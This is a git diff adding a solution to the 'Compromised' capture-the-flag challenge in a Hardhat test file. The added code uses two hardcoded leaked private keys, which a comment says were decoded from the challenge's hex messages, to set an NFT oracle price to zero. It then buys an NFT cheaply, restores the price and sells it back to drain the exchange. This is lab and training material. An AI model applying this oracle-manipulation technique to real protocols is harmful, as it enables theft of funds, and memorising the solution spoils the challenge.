@@ -1,6 +1,7 @@
-const { expect } = require('chai');
+const { expect } = require('chai'); 
 const { ethers } = require('hardhat');
 const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
+const { Wallet } = require('ethers');
 
 describe('Compromised challenge', function () {
     let deployer, player;
@@ -52,7 +53,49 @@ describe('Compromised challenge', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        /* to get this PKs you need to convert HEX messages from the snippet to string and then to Base64*/
+        const privateKey1 = '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9';
+        const privateKey2 = '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';
+        let wallet1 = new ethers.Wallet(privateKey1,ethers.provider);
+        let wallet2 = new ethers.Wallet(privateKey2,ethers.provider);
+
+        /*console.log("!!!!!!!!!!!!!!!!!!!!!!!!!");
+        console.log("BUY");*/
+
+        await oracle.connect(wallet1).postPrice('DVNFT',0);
+        await oracle.connect(wallet2).postPrice('DVNFT',0);
+        
+        const nftID = await exchange.connect(player).callStatic.buyOne({value: PLAYER_INITIAL_ETH_BALANCE/3n});
+        await exchange.connect(player).buyOne({value: PLAYER_INITIAL_ETH_BALANCE/3n});
+        
+        /*console.log("player->",await player.address);
+        console.log("nftID->", nftID);
+        console.log("owner->",await nftToken.ownerOf(nftID));
+        console.log("balance player->",await ethers.provider.getBalance(player.address));
+        console.log("balance exchange->",await ethers.provider.getBalance(exchange.address));
+
+        console.log("1->",await oracle.getPriceBySource('DVNFT',sources[0]));
+        console.log("2->",await oracle.getPriceBySource('DVNFT',sources[1]));
+        console.log("3->",await oracle.getPriceBySource('DVNFT',sources[2]));
+        console.log("price->",await oracle.getMedianPrice('DVNFT'));
+
+        console.log("!!!!!!!!!!!!!!!!!!!!!!!!!");
+        console.log("SELL");*/
+
+        await oracle.connect(wallet1).postPrice('DVNFT',INITIAL_NFT_PRICE);
+        await oracle.connect(wallet2).postPrice('DVNFT',INITIAL_NFT_PRICE);
+
+        await nftToken.connect(player).approve(exchange.address,nftID);
+        await exchange.connect(player).sellOne(nftID);
+
+        /*console.log("owner->",await nftToken.ownerOf(nftID));
+        console.log("balance player->",await ethers.provider.getBalance(player.address));
+        console.log("balance exchange->",await ethers.provider.getBalance(exchange.address));
+
+        console.log("1->",await oracle.getPriceBySource('DVNFT',sources[0]));
+        console.log("2->",await oracle.getPriceBySource('DVNFT',sources[1]));
+        console.log("3->",await oracle.getPriceBySource('DVNFT',sources[2]));
+        console.log("price->",await oracle.getMedianPrice('DVNFT'));*/
     });
 
     after(async function () {
